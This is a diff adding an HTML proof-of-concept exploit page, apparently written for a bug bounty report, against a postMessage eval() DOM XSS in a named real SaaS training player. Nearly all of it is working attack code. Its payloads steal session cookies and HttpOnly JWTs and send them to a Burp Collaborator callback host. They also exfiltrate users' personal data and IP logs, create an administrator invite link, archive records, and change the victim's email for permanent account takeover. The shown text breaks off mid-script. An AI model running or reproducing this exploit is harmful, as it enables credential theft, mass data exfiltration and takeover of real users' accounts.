@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html>
+<head><title>postMessage eval() DOM XSS — P1 Full CRUD + HttpOnly Bypass + Permanent ATO</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a1a;color:#e0e0e0;padding:0;min-height:100vh}
+.header{background:linear-gradient(135deg,#1a0000 0%,#0a0a0f 50%,#000a1a 100%);border-bottom:2px solid #1a1a2e;padding:24px 32px;text-align:center}
+.header h1{font-size:22px;color:#ff4444;letter-spacing:0.5px}
+.header .sub{color:#666;font-size:13px;margin-top:6px}
+.header .badges{margin-top:10px}
+.badge{display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;font-family:monospace;margin:2px}
+.badge.p1{background:#ff1744;color:#fff}.badge.vrt{background:#2979ff;color:#fff}.badge.ato{background:#ff6d00;color:#fff}
+.badge.httponly{background:#aa00ff;color:#fff}.badge.email{background:#00c853;color:#fff}
+.badge.critical{background:#ff1744;color:#fff}.badge.success{background:#00c853;color:#fff}
+.badge.info{background:#2979ff;color:#fff}.badge.warn{background:#ff9100;color:#000}
+.badge.destroy{background:#d500f9;color:#fff}
+.progress-bar{height:4px;background:#1a1a3e;border-radius:2px;margin:16px 0 0;overflow:hidden}
+.progress-bar .fill{height:100%;background:linear-gradient(90deg,#ff4444,#ff9100,#ffd600,#00e676);border-radius:2px;transition:width 0.5s}
+#status-line{text-align:center;margin-top:8px;font-size:13px;color:#ffd600;font-family:monospace}
+
+.container{max-width:1000px;margin:0 auto;padding:20px 24px}
+
+.config-panel{background:#111128;border:1px solid #222;border-radius:12px;padding:20px;margin-bottom:16px}
+.config-panel label{color:#78909c;font-size:11px;text-transform:uppercase;letter-spacing:1px;display:block;margin-bottom:5px}
+.config-panel input{width:100%;background:#0a0a1a;border:1px solid #2a2a3e;color:#4fc3f7;padding:10px 12px;font-family:monospace;font-size:13px;border-radius:6px}
+.config-panel input:focus{outline:none;border-color:#ff4444;box-shadow:0 0 8px rgba(255,68,68,0.2)}
+.config-panel .hint{color:#455a64;font-size:11px;margin-top:4px}
+.config-row{display:flex;gap:12px;margin-top:12px;align-items:end}
+.config-row .field{flex:1}
+
+.controls{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;align-items:center}
+.btn{border:none;padding:12px 24px;font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;border-radius:8px;transition:all 0.15s}
+.btn:disabled{opacity:0.25;cursor:not-allowed;transform:none!important}
+.btn-primary{background:linear-gradient(135deg,#ff4444,#d50000);color:#fff;font-size:15px;padding:14px 32px}
+.btn-primary:hover:not(:disabled){transform:scale(1.02);box-shadow:0 0 24px rgba(255,68,68,0.4)}
+.btn-safe{background:#1a3a1a;color:#69f0ae;border:1px solid #2e7d32}
+.btn-safe:hover:not(:disabled){background:#1b5e20}
+.btn-alert{background:#3e2723;color:#ffab40;border:1px solid #e65100}
+.btn-alert:hover:not(:disabled){background:#4e342e}
+.btn-crud{background:#1a237e;color:#82b1ff;border:1px solid #283593}
+.btn-crud:hover:not(:disabled){background:#283593}
+.auto-chk{display:flex;align-items:center;gap:8px;margin-left:auto}
+.auto-chk input{accent-color:#ff4444;width:16px;height:16px}
+.auto-chk label{color:#78909c;font-size:12px;cursor:pointer}
+
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.card{background:#111128;border:1px solid #222;border-radius:12px;padding:16px;overflow:hidden}
+.card.full{grid-column:1/-1}
+.card h2{font-size:13px;text-transform:uppercase;letter-spacing:1.5px;color:#546e7a;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.dot{width:8px;height:8px;border-radius:50%;display:inline-block;flex-shrink:0}
+.dot.red{background:#ff4444}.dot.green{background:#00e676}.dot.yellow{background:#ffd600}.dot.blue{background:#448aff}.dot.purple{background:#aa00ff}
+
+.val{font-family:monospace;font-size:12px;word-break:break-all;line-height:1.7;color:#b0bec5}
+.val .label{color:#546e7a;font-size:10px;display:block;margin-top:8px;text-transform:uppercase;letter-spacing:1px}
+.val .highlight{color:#fff;background:#1a237e;padding:2px 6px;border-radius:3px}
+.val .secret{color:#ff8a80;font-weight:700}
+
+.cookie-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
+.cookie-item{background:#0d0d20;border:1px solid #1a1a3e;border-radius:6px;padding:8px 10px;font-family:monospace;font-size:11px;word-break:break-all}
+.cookie-item .ck-name{color:#ffd600;font-weight:700;display:block;margin-bottom:2px}
+.cookie-item .ck-val{color:#78909c}
+.cookie-item .ck-flags{color:#e53935;font-size:10px;margin-top:3px;display:block;font-weight:700}
+
+.timeline{list-style:none;padding:0}
+.timeline li{padding:6px 0 6px 24px;border-left:2px solid #1a1a3e;position:relative;font-size:12px;font-family:monospace;color:#90a4ae}
+.timeline li:before{content:'';width:8px;height:8px;border-radius:50%;background:#333;position:absolute;left:-5px;top:10px}
+.timeline li.done:before{background:#00e676}
+.timeline li.active:before{background:#ffd600;box-shadow:0 0 6px #ffd600}
+.timeline li.error:before{background:#ff1744}
+.timeline li.destroy:before{background:#d500f9;box-shadow:0 0 6px #d500f9}
+.timeline li .ts{color:#455a64;margin-right:8px}
+
+.invite-box{background:#1b5e20;border:2px solid #00e676;border-radius:8px;padding:14px;margin-top:8px;text-align:center}
+.invite-box .link{font-size:13px;color:#69f0ae;word-break:break-all;font-family:monospace;margin:6px 0}
+.invite-box .copy-hint{font-size:11px;color:#81c784}
+.hexdump{font-family:monospace;font-size:10px;color:#455a64;background:#050510;padding:8px;border-radius:6px;max-height:100px;overflow-y:auto;word-break:break-all;margin-top:6px}
+
+.user-table{width:100%;border-collapse:collapse;font-size:12px;font-family:monospace;margin-top:8px}
+.user-table th{background:#1a1a3e;color:#4fc3f7;padding:6px 8px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:1px}
+.user-table td{padding:5px 8px;border-bottom:1px solid #1a1a3e;color:#b0bec5}
+.user-table tr:hover td{background:#111140}
+.user-table .pii{color:#ff8a80;font-weight:700}
+
+.httponly-note{background:#1a0000;border:1px solid #ff4444;border-radius:8px;padding:12px;margin-top:12px;font-size:12px;color:#ff8a80;line-height:1.6}
+.httponly-note strong{color:#ff4444}
+
+.crud-badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:10px;font-weight:700;font-family:monospace;margin-right:4px}
+.crud-c{background:#1b5e20;color:#69f0ae}
+.crud-r{background:#1a237e;color:#82b1ff}
+.crud-u{background:#e65100;color:#ffcc80}
+.crud-d{background:#b71c1c;color:#ef9a9a}
+.crud-s{background:#4a148c;color:#ce93d8}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>postMessage eval() DOM XSS &mdash; Full CRUD + HttpOnly Bypass + Permanent ATO</h1>
+  <div class="sub">postMessage to player.html &rarr; receiveMessage &rarr; eval(event.data) &rarr; Full CRUD + SetCookies HttpOnly Bypass + UpdateEmail &rarr; Permanent ATO</div>
+  <div class="badges">
+    <span class="badge p1">P1 CRITICAL</span>
+    <span class="badge vrt">DOM-based XSS</span>
+    <span class="badge ato">FULL ATO</span>
+    <span class="badge httponly">HTTPONLY BYPASS</span>
+  </div>
+  <div class="progress-bar"><div class="fill" id="progress" style="width:0%"></div></div>
+  <div id="status-line">Ready &mdash; configure and click Start</div>
+</div>
+
+<div class="container">
+
+  <div class="config-panel">
+    <label>Collaborator / Callback URL (triager: paste your own here)</label>
+    <input type="text" id="collab" value="https://kl9pr6tl9j7b363dlfln8evu6lce06ov.oastify.com" placeholder="https://your-id.oastify.com or https://webhook.site/your-id">
+    <div class="hint">All exfiltrated data is POST'd to this URL with /sc-* path tags. Replace with your Burp Collaborator or webhook.site URL.</div>
+    <div class="config-row">
+      <div class="field">
+        <label>Player URL</label>
+        <input type="text" id="player-url" value="https://app.au.safetyculture.com/training/engine/player.html">
+      </div>
+      <div class="field" style="max-width:100px">
+        <label>Wait (s)</label>
+        <input type="number" id="wait-sec" value="5" min="3" max="30">
+      </div>
+    </div>
+    <div class="config-row">
+      <div class="field">
+        <label>Attacker Email (for UpdateEmail ATO)</label>
+        <input type="text" id="atk-email" value="attacker-ato-poc@bugcrowdninja.com" placeholder="attacker@evil.com">
+        <div class="hint">UpdateEmail changes victim's email to this address &mdash; no password or confirmation required. Then password reset &rarr; permanent ATO.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="controls">
+    <button class="btn btn-primary" id="btn-start" onclick="startExploit()">Start Exploit</button>
+    <button class="btn btn-safe" id="btn-safe" onclick="fireSafe()" disabled>Safe Test</button>
+    <button class="btn btn-alert" id="btn-alert" onclick="fireAlert()" disabled>Alert PoC</button>
+    <button class="btn btn-crud" id="btn-crud" onclick="fireCRUD()" disabled>Full CRUD + ATO</button>
+    <div class="auto-chk">
+      <input type="checkbox" id="auto-crud" checked>
+      <label for="auto-crud">Auto-run CRUD after eval confirmed</label>
+    </div>
+  </div>
+
+  <div class="grid" id="grid"></div>
+
+</div>
+
+<script>
+var G = document.getElementById('grid');
+var PB = document.getElementById('progress');
+var SL = document.getElementById('status-line');
+var win = null;
+var evalFired = false;
+var stepsDone = 0;
+var totalSteps = 14;
+
+function getCol() { return document.getElementById('collab').value.replace(/\/+$/, ''); }
+function getPlayer() { return document.getElementById('player-url').value; }
+function getWait() { return (parseInt(document.getElementById('wait-sec').value) || 5) * 1000; }
+function getAtkEmail() { return document.getElementById('atk-email').value || 'attacker-ato-poc@bugcrowdninja.com'; }
+
+function pct() { stepsDone++; PB.style.width = Math.min(100, Math.round(stepsDone/totalSteps*100)) + '%'; }
+function setStatus(t) { SL.textContent = t; }
+function esc(s) { var d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
+
+function addCard(id, title, dotColor, content, full) {
+  var existing = document.getElementById('card-' + id);
+  if (existing) { existing.querySelector('.card-body').innerHTML = content; return; }
+  var c = document.createElement('div');
+  c.className = 'card' + (full ? ' full' : '');
+  c.id = 'card-' + id;
+  c.innerHTML = '<h2><span class="dot ' + dotColor + '"></span>' + title + '</h2><div class="card-body">' + content + '</div>';
+  G.appendChild(c);
+}
+
+function tlAdd(msg, cls) {
+  var tl = document.getElementById('timeline');
+  if (!tl) return;
+  var li = document.createElement('li');
+  li.className = cls || 'done';
+  li.innerHTML = '<span class="ts">' + new Date().toLocaleTimeString() + '</span> ' + esc(msg);
+  tl.appendChild(li);
+  tl.parentElement.scrollTop = tl.parentElement.scrollHeight;
+}
+
+function parseCookies(cookieStr) {
+  if (!cookieStr) return '<span class="val">No cookies</span>';
+  var parts = cookieStr.split(';');
+  var html = '<div class="cookie-grid">';
+  parts.forEach(function(p) {
+    p = p.trim(); if (!p) return;
+    var eq = p.indexOf('=');
+    var name = eq > 0 ? p.substring(0, eq).trim() : p;
+    var val = eq > 0 ? p.substring(eq + 1) : '';
+    var isSensitive = /session|crumb|csrf|token|auth|jwt|s12at/i.test(name);
+    html += '<div class="cookie-item"><span class="ck-name">' + esc(name) + '</span><span class="ck-val">' + esc(val.substring(0, 100)) + (val.length > 100 ? '...' : '') + '</span>';
+    if (isSensitive) html += '<span class="ck-flags">SENSITIVE</span>';
+    html += '</div>';
+  });
+  return html + '</div>';
+}
+
+// ─── Exploit Stages ───
+
+function startExploit() {
+  document.getElementById('btn-start').disabled = true;
+  stepsDone = 0;
+
+  addCard('timeline', 'Attack Timeline', 'yellow',
+    '<div style="max-height:300px;overflow-y:auto"><ul class="timeline" id="timeline"></ul></div>', true);
+
+  setStatus('Opening player.html popup...');
+  tlAdd('Opening popup: ' + getPlayer(), 'active');
+
+  win = window.open(getPlayer());
+  if (!win) {
+    setStatus('POPUP BLOCKED — allow popups and retry');
+    tlAdd('Popup blocked!', 'error');
+    document.getElementById('btn-start').disabled = false;
+    return;
+  }
+  pct();
+  tlAdd('Popup opened successfully');
+
+  addCard('origin', 'Cross-Origin Attack', 'blue',
+    '<div class="val"><span class="label">Attacker Origin</span><span class="highlight">' + esc(location.origin) + '</span>' +
+    '<span class="label">Target</span>app.au.safetyculture.com' +
+    '<span class="label">Method</span>postMessage to player.html &rarr; receiveMessage &rarr; eval(event.data)' +
+    '<span class="label">Origin Check</span><span class="secret">testsafetyculture.com bypass via .includes()</span></div>');
+
+  setStatus('Waiting ' + (getWait()/1000) + 's for player.html JS to load...');
+  tlAdd('Waiting ' + (getWait()/1000) + 's for player.html to load', 'active');
+  pct();
+
+  setTimeout(function() {
+    tlAdd('Timer complete — firing payloads');
+    document.getElementById('btn-safe').disabled = false;
+    document.getElementById('btn-alert').disabled = false;
+    document.getElementById('btn-crud').disabled = false;
+    fireSafe();
+  }, getWait());
+}
+
+function fireSafe() {
+  setStatus('Sending eval() confirmation payload...');
+  tlAdd('Sending safe eval test via postMessage', 'active');
+
+  var col = getCol();
+  var payload = ''
+    + 'var OP=window.opener;'
+    + 'function rpt(a,d){try{OP.postMessage({type:"r",api:a,data:typeof d==="string"?d:JSON.stringify(d)},"*")}catch(e){}}'
+    + 'var cookies=document.cookie;'
+    + 'var crumb="";try{var cm=cookies.match(/safetyculture_session_crumb=([^;]+)/);if(cm)crumb=cm[1]}catch(e){}'
+    + 'rpt("EVAL-FIRED",JSON.stringify({origin:location.origin,url:location.href,cookieLen:cookies.length,lsKeys:Object.keys(localStorage).length,crumb:crumb,ts:new Date().toISOString()}));'
+    + 'rpt("COOKIES",cookies);'
+    + 'fetch("' + col + '/sc-eval-confirm",{method:"POST",mode:"no-cors",body:"domain="+document.domain+"&cookies="+cookies.length+"&ts="+new Date().toISOString()}).catch(function(){});';
+
+  win.postMessage(payload, '*');
+  pct();
+  tlAdd('Safe payload sent to popup');
+
+  var retries = 0;
+  var timer = setInterval(function() {
+    retries++;
+    if (evalFired || retries > 20) { clearInterval(timer); return; }
+    try { win.postMessage(payload, '*'); } catch(e) {}
+    tlAdd('Retry #' + retries + ' — resending payload');
+  }, 2000);
+
+  addCard('waiting', 'Waiting for eval callback...', 'yellow',
+    '<div class="val">Payload sent — retrying every 2s until eval fires (max 20 retries)...</div>');
+}
+
+function fireAlert() {
+  var payload = 'alert("XSS on " + document.domain + "\\n\\nCookies: " + document.cookie.length + " bytes\\nlocalStorage: " + Object.keys(localStorage).length + " keys\\n\\npostMessage eval()\\nOrigin: " + location.origin)';
+  win.postMessage(payload, '*');
+  tlAdd('Alert popup fired in player tab');
+  addCard('alert-fired', 'Alert Popup', 'green',
+    '<div class="val"><span class="secret">alert() dialog fired in victim context</span><br>If the player tab shows a dialog, eval() is confirmed.</div>');
+}
+
+function fireCRUD() {
+  var col = getCol();
+  var atkEmail = getAtkEmail();
+  tlAdd('Starting full CRUD + HttpOnly bypass + ATO chain...', 'active');
+  setStatus('Running CRUD + ATO operations...');
+
+  var payload = '(function(){'
+    + 'var OP=window.opener;'
+    + 'function rpt(a,d){try{OP.postMessage({type:"r",api:a,data:typeof d==="string"?d:JSON.stringify(d)},"*")}catch(e){}}'
+    + 'var col="' + col + '";'
+    + 'var cookies=document.cookie;'
+    + 'var crumb="";try{var cm=cookies.match(/safetyculture_session_crumb=([^;]+)/);if(cm)crumb=cm[1]}catch(e){}'
+
+    // Protobuf helpers
+    + 'function pbStr(fn,v){var e=new TextEncoder().encode(v);var r=[(fn<<3)|2];var l=e.length;while(l>127){r.push((l&0x7f)|0x80);l>>=7}r.push(l);for(var i=0;i<e.length;i++)r.push(e[i]);return r}'
+    + 'function pbVarint(fn,v){return[(fn<<3)|0,v]}'
+    + 'function grpcWrap(pb){var len=pb.length;return new Uint8Array([0,(len>>24)&0xff,(len>>16)&0xff,(len>>8)&0xff,len&0xff].concat(pb))}'
+    + 'function gt(b){var a=new Uint8Array(b);var t="";for(var i=0;a.length>i;i++)t+=String.fromCharCode(a[i]);return t}'
+    + 'function toHex(bytes){var h="";for(var j=0;j<Math.min(bytes.length,2000);j++)h+=("0"+bytes[j].toString(16)).slice(-2);return h}'
+    + 'var gh={"Content-Type":"application/grpc-web+proto","X-Grpc-Web":"1"};'
+    + 'var gc={"Content-Type":"application/grpc-web+proto","X-Grpc-Web":"1"};'
+    + 'if(crumb)gc["X-CSRF-Token"]=crumb;'
+    + 'var ef=new Uint8Array([0,0,0,0,0]);'
+
+    // Cookie exfil to Collaborator
+    + 'fetch(col+"/sc-cookies",{method:"POST",mode:"no-cors",body:cookies}).catch(function(){});'
+
+    // READ: Identity
+    + 'fetch("/api/v2/accounts/me",{credentials:"include"}).then(function(r){return r.json()}).then(function(m){'
+    + 'rpt("IDENTITY",JSON.stringify({user_id:m.user_id,email:m.email,org:m.organisation_id,first:m.firstname,last:m.lastname}));'
+    + 'fetch(col+"/sc-identity",{method:"POST",mode:"no-cors",body:JSON.stringify({user_id:m.user_id,email:m.email,org:m.organisation_id})}).catch(function(){})'
+    + '}).catch(function(e){rpt("IDENTITY-ERR",""+e)});'
+
+    // READ: Users (mass PII)
+    + 'fetch("/feed/users",{credentials:"include"}).then(function(r){return r.json()}).then(function(fu){'
+    + 'rpt("FEED-USERS",JSON.stringify(fu));'
+    + 'fetch(col+"/sc-feed-users",{method:"POST",mode:"no-cors",body:JSON.stringify(fu)}).catch(function(){})'
+    + '}).catch(function(e){rpt("FEED-USERS-ERR",""+e)});'
+
+    // READ: Activity Logs (IPs)
+    + 'fetch("/api/v3/s12.audit.v1.ActivityLogService/ListActivityLogEvents",{method:"POST",headers:gh,credentials:"include",body:ef}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+    + 'var bytes=new Uint8Array(buf);var t=gt(buf);var ips=t.match(/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/g);'
+    + 'rpt("ACTIVITY-LOGS",JSON.stringify({len:bytes.length,ips:ips,hex:toHex(bytes)}));'
+    + 'fetch(col+"/sc-activity-logs",{method:"POST",mode:"no-cors",body:new Blob([bytes])}).catch(function(){})'
+    + '}).catch(function(e){rpt("ACTIVITY-LOGS-ERR",""+e)});'
+
+    // READ: Permission sets + CREATE: Admin invite
+    + 'fetch("/api/v3/s12.permissions.v1.PermissionsService/ListPermissionSets",{method:"POST",headers:gh,credentials:"include",body:ef}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+    + 'var t=gt(buf);var uu=t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g)||[];'
+    + 'var AU=null;var ai=t.toLowerCase().indexOf("dministrator");'
+    + 'if(ai>0){var ch=t.substring(Math.max(0,ai-200),ai+50);var nu=ch.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g);if(nu)AU=nu[nu.length-1]}'
+    + 'if(!AU&&uu.length>0)AU=uu[0];'
+    + 'rpt("PERMS",JSON.stringify({admin_uuid:AU,total:uu.length,all:uu}));'
+    + 'fetch(col+"/sc-perms",{method:"POST",mode:"no-cors",body:JSON.stringify({admin:AU,total:uu.length})}).catch(function(){});'
+
+    // CREATE: Full-Seat Administrator invite
+    + 'if(AU){'
+    + 'var invPb=pbStr(1,"XSS-Full-Admin").concat(pbVarint(2,2)).concat(pbVarint(3,1)).concat(pbVarint(5,1)).concat(pbStr(7,AU)).concat(pbVarint(8,1));'
+    + 'fetch("/api/v3/s12.accounts.invite.v1.InviteService/CreateOrganisationInviteLink",{method:"POST",headers:gc,credentials:"include",body:grpcWrap(invPb)}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+    + 'var bytes=new Uint8Array(buf);var t="";for(var i=0;i<bytes.length;i++)t+=String.fromCharCode(bytes[i]);'
+    + 'var link=t.match(/https:\\/\\/app[^\\x00-\\x1f]*/);'
+    + 'rpt("INVITE-CREATED",JSON.stringify({url:link?link[0]:null,admin_uuid:AU,hex:toHex(bytes)}));'
+    + 'if(link)fetch(col+"/sc-invite-full-admin",{method:"POST",mode:"no-cors",body:link[0]}).catch(function(){})'
+    + '}).catch(function(e){rpt("INVITE-ERR",""+e)})'
+    + '}'
+
+    // READ: Existing invites
+    + 'var listPb=pbVarint(2,25).concat(pbVarint(3,1)).concat(pbVarint(4,3)).concat(pbVarint(5,1)).concat(pbStr(6,""));'
+    + 'fetch("/api/v3/s12.accounts.invite.v1.InviteService/ListOrganisationInvites",{method:"POST",headers:gh,credentials:"include",body:grpcWrap(listPb)}).then(function(r){return r.text()}).then(function(t){'
+    + 'var links=t.match(/invite\\/organisation\\/[A-Za-z0-9]+/g)||[];'
+    + 'rpt("STOLEN-INVITES",JSON.stringify({count:links.length,links:links}));'
+    + 'if(links.length)fetch(col+"/sc-invites-stolen",{method:"POST",mode:"no-cors",body:JSON.stringify(links)}).catch(function(){})'
+    + '}).catch(function(e){rpt("STOLEN-INVITES-ERR",""+e)});'
+
+    // UPDATE: Org settings
+    + 'fetch("/api/v3/s12.settings.v1.SettingsService/UpdateSettings",{method:"POST",headers:gc,credentials:"include",body:ef}).then(function(r){return r.text()}).then(function(t){'
+    + 'rpt("SETTINGS-WRITE",JSON.stringify({response_len:t.length,confirmed:true}));'
+    + 'fetch(col+"/sc-settings-write",{method:"POST",mode:"no-cors",body:"write_confirmed:len="+t.length}).catch(function(){})'
+    + '}).catch(function(e){rpt("SETTINGS-ERR",""+e)});'
+
+    // READ: Inspections + DELETE: Archive
+    + 'fetch("/feed/inspections",{credentials:"include"}).then(function(r){return r.json()}).then(function(d){'
+    + 'var cnt=d.data?d.data.length:0;'
+    + 'rpt("INSPECTIONS",JSON.stringify({count:cnt}));'
+    + 'if(d.data&&d.data.length>0){'
+    + 'var auditId=d.data[0].audit_id;'
+    + 'var archPb=pbStr(1,auditId);'
+    + 'fetch("/api/v3/s12.inspection.v1.InspectionService/ArchiveInspection",{method:"POST",headers:gc,credentials:"include",body:grpcWrap(archPb)}).then(function(r){return r.arrayBuffer()}).then(function(buf2){'
+    + 'var t2=gt(buf2);rpt("DELETE-INSPECTION",JSON.stringify({auditId:auditId,status:t2.indexOf("grpc-status:0")>=0?"DELETED":"gs:"+t2.match(/grpc-status:\\d+/)}));'
+    + 'fetch(col+"/sc-delete-inspection",{method:"POST",mode:"no-cors",body:"DELETED:"+auditId}).catch(function(){})'
+    + '}).catch(function(){})}'
+    + '}).catch(function(e){rpt("INSPECTIONS-ERR",""+e)});'
+
+    + '}).catch(function(e){rpt("PERMS-ERR",""+e)});'
+
+    // ══════════════════════════════════════════════════════════════
+    // SetCookies — HTTPONLY BYPASS — Extract s12at JWT from body
+    // ══════════════════════════════════════════════════════════════
+    + 'fetch("/api/v3/s12.identity.v1.AuthenticationService/SetCookies",{method:"POST",headers:gc,credentials:"include",body:grpcWrap(pbStr(1,"xss_extract_token_poc"))}).then(function(r){return r.arrayBuffer()}).then(function(buf){'
+    + 'var txt=gt(buf);'
+    + 'var jm=txt.match(/s12at=(eyJ[A-Za-z0-9_.-]+)/);'
+    + 'var sm=txt.match(/safetyculture_session=(Fe26\\.2[^;]+)/);'
+    + 'var cm2=txt.match(/safetyculture_session_crumb=([^;]+)/);'
+    + 'var jwt=jm?jm[1]:null;var sess=sm?sm[1]:null;var crumb2=cm2?cm2[1]:null;'
+    + 'var uid=null;var jwtExp=null;var jwtOrg=null;'
+    + 'if(jwt){try{var jp=JSON.parse(atob(jwt.split(".")[1].replace(/-/g,"+").replace(/_/g,"/")));uid=jp.sub;jwtExp=jp.exp;jwtOrg=jp.org}catch(e){}}'
+    + 'rpt("SETCOOKIES-HTTPONLY",JSON.stringify({jwt_len:jwt?jwt.length:0,jwt_preview:jwt?jwt.substring(0,80)+"...":null,session_len:sess?sess.length:0,crumb:crumb2,user_id:uid,exp:jwtExp,org:jwtOrg,response_bytes:buf.byteLength}));'
+    // Exfil full HttpOnly JWT + session via POST (Burp Collaborator captures body)
+    + 'if(jwt){fetch(col+"/sc-HTTPONLY-JWT-STOLEN",{method:"POST",mode:"no-cors",body:"HTTPONLY_S12AT_JWT="+jwt}).catch(function(){})}'
+    + 'if(sess){fetch(col+"/sc-HTTPONLY-SESSION-STOLEN",{method:"POST",mode:"no-cors",body:"HTTPONLY_SESSION="+sess}).catch(function(){})}'
+    + 'if(crumb2){fetch(col+"/sc-csrf-token",{method:"POST",mode:"no-cors",body:"CSRF="+crumb2}).catch(function(){})}'
+
+    // ══════════════════════════════════════════════════════════════
+    // UpdateEmail — change victim email → permanent ATO
+    // ══════════════════════════════════════════════════════════════
+    + 'if(uid){'
+    + 'var atkEmail="' + atkEmail + '";'
+    + 'var uePb=pbStr(1,uid).concat(pbStr(2,atkEmail));'
+    + 'fetch("/api/v3/s12.identity.admin.v1.IdentityManagementService/UpdateEmail",{method:"POST",headers:gc,credentials:"include",body:grpcWrap(uePb)}).then(function(r2){return r2.arrayBuffer()}).then(function(buf2){'
+    + 'var t2=gt(buf2);var gs=t2.match(/grpc-status:(\\d+)/);var status=gs?gs[1]:"unknown";'
+    + 'rpt("UPDATEEMAIL-ATO",JSON.stringify({victim_uid:uid,new_email:atkEmail,grpc_status:status,success:status==="0"}));'
+    + 'fetch(col+"/sc-EMAIL-CHANGED",{method:"POST",mode:"no-cors",body:"VICTIM:"+uid+"|EMAIL:"+atkEmail+"|STATUS:"+status}).catch(function(){})'
+    + '}).catch(function(e){rpt("UPDATEEMAIL-ERR",""+e)})'
+    + '}'
+
+    + '}).catch(function(e){rpt("SETCOOKIES-ERR",""+e)});'
+
+    + 'rpt("CRUD-STARTED","all_requests_sent");'
+    + '})()';
+
+  win.postMessage(payload, '*');
+  pct();
+  tlAdd('Full CRUD + ATO payload sent');
+}
+
+// ─── Result Handler ───
+window.addEventListener('message', function(ev) {
+  if (!ev.data || ev.data.type !== 'r') return;
+  evalFired = true;
+  var api = ev.data.api;
+  var data = ev.data.data;
+
+  switch(api) {
+    case 'EVAL-FIRED':
+      pct();
+      try {
+        var info = JSON.parse(data);
+        setStatus('eval() CONFIRMED in ' + info.origin);
+        tlAdd('eval() fired! Origin: ' + info.origin + ', Cookies: ' + info.cookieLen + 'B, localStorage: ' + info.lsKeys + ' keys');
+
+        var existing = document.getElementById('card-waiting');
+        if (existing) existing.remove();
+
+        addCard('eval', 'eval() Execution Confirmed <span class="badge p1">XSS</span>', 'green',
+          '<div class="val"><span class="label">Victim Origin</span><span class="highlight">' + esc(info.origin) + '</span>' +
+          '<span class="label">CSRF Token (safetyculture_session_crumb)</span><span class="secret">' + esc(info.crumb) + '</span>' +
+          '<span class="label">Cookie Size</span>' + info.cookieLen + ' bytes' +
+          '<span class="label">localStorage Keys</span>' + info.lsKeys +
+          '<span class="label">Timestamp</span>' + esc(info.ts) + '</div>');
+
+        if (document.getElementById('auto-crud').checked) {
+          setTimeout(fireCRUD, 500);
+        }
+      } catch(e) {}
+      break;
+
+    case 'COOKIES':
+      pct();
+      tlAdd('Session cookies exfiltrated (' + data.length + ' bytes)');
+      addCard('cookies', 'Stolen Session Cookies <span class="badge critical">EXFILTRATED</span>', 'red', parseCookies(data), true);
+      break;
+
+    case 'IDENTITY':
+      pct();
+      try {
+        var id = JSON.parse(data);
+        tlAdd('READ: Identity — ' + id.email);
+        addCard('identity', '<span class="crud-badge crud-r">READ</span> Victim Identity', 'blue',
+          '<div class="val"><span class="label">Email</span><span class="secret">' + esc(id.email || '?') + '</span>' +
+          '<span class="label">User ID</span>' + esc(id.user_id || '?') +
+          '<span class="label">Organisation ID</span>' + esc(id.org || '?') +
+          '<span class="label">Name</span>' + esc((id.first || '') + ' ' + (id.last || '')) + '</div>');
+      } catch(e) {}
+      break;
+
+    case 'FEED-USERS':
+      pct();
+      try {
+        var fu = JSON.parse(data);
+        var users = fu.data || [];
+        tlAdd('READ: /feed/users — ' + users.length + ' users PII exfiltrated');
+        var tableHtml = '<div style="max-height:300px;overflow-y:auto"><table class="user-table"><thead><tr><th>#</th><th>Email</th><th>First Name</th><th>Last Name</th><th>Status</th></tr></thead><tbody>';
+        users.forEach(function(u, i) {
+          tableHtml += '<tr><td>' + (i+1) + '</td><td class="pii">' + esc(u.email || '?') + '</td><td class="pii">' + esc(u.firstname || '') + '</td><td class="pii">' + esc(u.lastname || '') + '</td><td>' + (u.active ? 'Active' : 'Inactive') + '</td></tr>';
+        });
+        tableHtml += '</tbody></table></div>';
+        addCard('feed-users', '<span class="crud-badge crud-r">READ</span> Mass PII — ' + users.length + ' Users <span class="badge critical">EXFILTRATED</span>', 'blue', tableHtml, true);
+      } catch(e) {}
+      break;
+
+    case 'PERMS':
+      pct();
+      try {
+        var p = JSON.parse(data);
+        tlAdd('READ: ' + p.total + ' permission sets, Admin UUID: ' + (p.admin_uuid || 'not found'));
+        addCard('perms', '<span class="crud-badge crud-r">READ</span> Permission Sets', 'blue',
+          '<div class="val"><span class="label">Total Permission Sets</span>' + p.total +
+          '<span class="label">Administrator UUID</span><span class="secret">' + esc(p.admin_uuid || 'not found') + '</span></div>');
+      } catch(e) {}
+      break;
+
+    case 'INVITE-CREATED':
+      pct();
+      try {
+        var inv = JSON.parse(data);
+        tlAdd('CREATE: Full-Seat Admin invite link generated!', 'active');
+        if (inv.url) {
+          addCard('invite', '<span class="crud-badge crud-c">CREATE</span> Full-Seat Admin Invite <span class="badge critical">PERSISTENT ATO</span>', 'red',
+            '<div class="invite-box">' +
+            '<div style="font-size:14px;font-weight:700;color:#69f0ae;margin-bottom:6px">Full-Seat Administrator Invite Link</div>' +
+            '<div class="link">' + esc(inv.url) + '</div>' +
+            '<div class="copy-hint">Attacker opens this link &rarr; joins org as Full-Seat Administrator &rarr; persistent ATO</div>' +
+            '</div>', true);
+        }
+      } catch(e) {}
+      break;
+
+    case 'STOLEN-INVITES':
+      pct();
+      try {
+        var si = JSON.parse(data);
+        tlAdd('READ: ' + si.count + ' existing invite links stolen');
+        if (si.count > 0) {
